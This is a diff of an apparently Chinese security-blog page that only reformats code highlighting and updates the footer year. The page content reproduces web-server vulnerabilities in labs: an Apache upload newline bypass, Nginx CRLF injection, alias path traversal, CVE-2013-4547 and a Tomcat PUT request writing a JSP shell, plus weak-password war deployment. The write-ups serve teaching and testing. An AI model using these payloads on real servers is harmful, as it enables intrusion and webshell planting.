@@ -277,16 +277,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
-    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;php3&#39;</span><span class="p">,</span> <span class="s1">&#39;php4&#39;</span><span class="p">,</span> <span class="s1">&#39;php5&#39;</span><span class="p">,</span> <span class="s1">&#39;phtml&#39;</span><span class="p">,</span> <span class="s1">&#39;pht&#39;</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;bad file&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="s1">&#39;./&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;php3&#39;</span><span class="p">,</span> <span class="s1">&#39;php4&#39;</span><span class="p">,</span> <span class="s1">&#39;php5&#39;</span><span class="p">,</span> <span class="s1">&#39;phtml&#39;</span><span class="p">,</span> <span class="s1">&#39;pht&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;bad file&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="s1">&#39;./&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在 1.php 后面插入一个 \x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截：</p>
 <p><img
@@ -344,10 +344,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">location / {
-    return 302 https://$host$uri;
-}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">location / {
+</span></span><span class="line"><span class="cl">    return 302 https://$host$uri;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="3112-漏洞复现">3.1.1.2 漏洞复现</h5>
 <p>Payload： <code>http://your-ip:8080/%0a%0dSet-Cookie:%20a=1</code>，可注入 Set-Cookie 头。</p>
@@ -377,10 +377,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">location /files {
-    alias /home/;
-}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">location /files {
+</span></span><span class="line"><span class="cl">    alias /home/;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Payload:：<code>http://your-ip:8081/files../</code> ，成功穿越到根目录：</p>
 <p><img
@@ -489,15 +489,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">location ~ \.php$ {
-    include        fastcgi_params;
-
-    fastcgi_pass   127.0.0.1:9000;
-    fastcgi_index  index.php;
-    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
-    fastcgi_param  DOCUMENT_ROOT /var/www/html;
-}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">location ~ \.php$ {
+</span></span><span class="line"><span class="cl">    include        fastcgi_params;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    fastcgi_pass   127.0.0.1:9000;
+</span></span><span class="line"><span class="cl">    fastcgi_index  index.php;
+</span></span><span class="line"><span class="cl">    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
+</span></span><span class="line"><span class="cl">    fastcgi_param  DOCUMENT_ROOT /var/www/html;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>正常情况下（关闭 <code>pathinfo</code> 的情况下），只有 <code>.php</code> 后缀的文件才会被发送给 <code>fastcgi</code> 解析。</p>
 <p>而存在 <code>CVE-2013-4547</code> 的情况下，我们请求 <code>1.gif[0x20][0x00].php</code>，这个 URI 可以匹配上正则 <code>\.php$</code>，可以进入这个 Location 块；但进入后，Nginx 却错误地认为请求的文件是 <code>1.gif[0x20]</code>，就设置其为 <code>SCRIPT_FILENAME</code> 的值发送给 <code>fastcgi</code>。</p>
@@ -538,11 +538,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">location /admin/ {
-    allow 127.0.0.1;
-    deny all;
-}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">location /admin/ {
+</span></span><span class="line"><span class="cl">    allow 127.0.0.1;
+</span></span><span class="line"><span class="cl">    deny all;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>通过请求如下 URI：<code>/test[0x20]/../admin/index.php</code>，这个 URI 不会匹配上 location 后面的 <code>/admin/</code>，也就绕过了其中的 IP 验证</p>
 <p>但最后请求的是 <code>/test[0x20]/../admin/index.php</code> 文件，也就是 <code>/admin/index.php</code>，成功访问到后台。</p>
@@ -599,24 +599,24 @@
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;servlet&gt;
-    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
-    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;debug&lt;/param-name&gt;
-        &lt;param-value&gt;0&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;listings&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;readonly&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
-&lt;/servlet&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;servlet&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
+</span></span><span class="line"><span class="cl">    &lt;init-param&gt;
+</span></span><span class="line"><span class="cl">        &lt;param-name&gt;debug&lt;/param-name&gt;
+</span></span><span class="line"><span class="cl">        &lt;param-value&gt;0&lt;/param-value&gt;
+</span></span><span class="line"><span class="cl">    &lt;/init-param&gt;
+</span></span><span class="line"><span class="cl">    &lt;init-param&gt;
+</span></span><span class="line"><span class="cl">        &lt;param-name&gt;listings&lt;/param-name&gt;
+</span></span><span class="line"><span class="cl">        &lt;param-value&gt;false&lt;/param-value&gt;
+</span></span><span class="line"><span class="cl">    &lt;/init-param&gt;
+</span></span><span class="line"><span class="cl">    &lt;init-param&gt;
+</span></span><span class="line"><span class="cl">        &lt;param-name&gt;readonly&lt;/param-name&gt;
+</span></span><span class="line"><span class="cl">        &lt;param-value&gt;false&lt;/param-value&gt;
+</span></span><span class="line"><span class="cl">    &lt;/init-param&gt;
+</span></span><span class="line"><span class="cl">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+</span></span><span class="line"><span class="cl">&lt;/servlet&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>虽然 Tomcat 对文件后缀有一定检测（不能直接写 jsp），但我们使用一些文件系统的特性（如 Linux 下可用 / ）来绕过了限制。</p>
 <p>直接发送以下数据包即可在 Web 根目录写入 shell：</p>
@@ -634,17 +634,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">PUT</span> <span class="nn">/1.jsp/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="n">Host</span><span class="o">:</span> <span class="l">your-ip:8080</span>
-<span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
-<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
-<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span>
-<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
-<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
-<span class="n">Content-Length</span><span class="o">:</span> <span class="l">5</span>
-
-shell
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">PUT</span> <span class="nn">/1.jsp/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">your-ip:8080</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">shell
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="42-tomcat-弱口令">4.2 Tomcat 弱口令</h3>
 <p>Tomcat 支持在后台部署 war 文件，可以直接将 webshell 部署到 web 目录下。其中，欲访问后台，需要对应用户有相应权限。</p>
@@ -687,22 +687,22 @@ shell
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
-<span class="nt">&lt;tomcat-users</span> <span class="na">xmlns=</span><span class="s">&#34;http://tomcat.apache.org/xml&#34;</span>
-              <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
-              <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;</span>
-              <span class="na">version=</span><span class="s">&#34;1.0&#34;</span><span class="nt">&gt;</span>
-
-    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;manager-gui&#34;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;manager-script&#34;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;manager-jmx&#34;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;manager-status&#34;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;admin-gui&#34;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;admin-script&#34;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">&#34;tomcat&#34;</span> <span class="na">password=</span><span class="s">&#34;tomcat&#34;</span> <span class="na">roles=</span><span class="s">&#34;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&#34;</span> <span class="nt">/&gt;</span>
-    
-<span class="nt">&lt;/tomcat-users&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;tomcat-users</span> <span class="na">xmlns=</span><span class="s">&#34;http://tomcat.apache.org/xml&#34;</span>
+</span></span><span class="line"><span class="cl">              <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span class="line"><span class="cl">              <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;</span>
+</span></span><span class="line"><span class="cl">              <span class="na">version=</span><span class="s">&#34;1.0&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;manager-gui&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;manager-script&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;manager-jmx&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;manager-status&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;admin-gui&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;admin-script&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">&#34;tomcat&#34;</span> <span class="na">password=</span><span class="s">&#34;tomcat&#34;</span> <span class="na">roles=</span><span class="s">&#34;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/tomcat-users&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可见，用户 tomcat 拥有上述所有权限，密码是 tomcat。</p>
 <p>正常安装的情况下，tomcat8 中默认没有任何用户，且 manager 页面只允许本地 IP 访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
@@ -745,7 +745,7 @@ shell
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
